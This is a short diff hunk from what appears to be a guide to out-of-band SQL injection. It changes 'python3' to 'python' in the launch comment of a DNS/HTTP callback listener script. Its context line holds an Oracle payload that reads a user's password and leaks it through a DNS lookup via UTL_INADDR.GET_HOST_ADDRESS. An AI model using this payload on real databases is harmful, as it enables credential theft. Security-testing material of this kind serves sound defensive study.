@@ -321,7 +321,7 @@ SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM=1)||
 
 ```python
 # OOB Listener — 接收 DNS/HTTP callback
-# 启动: python3 oob_listener.py
+# 启动: python oob_listener.py
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import re
 
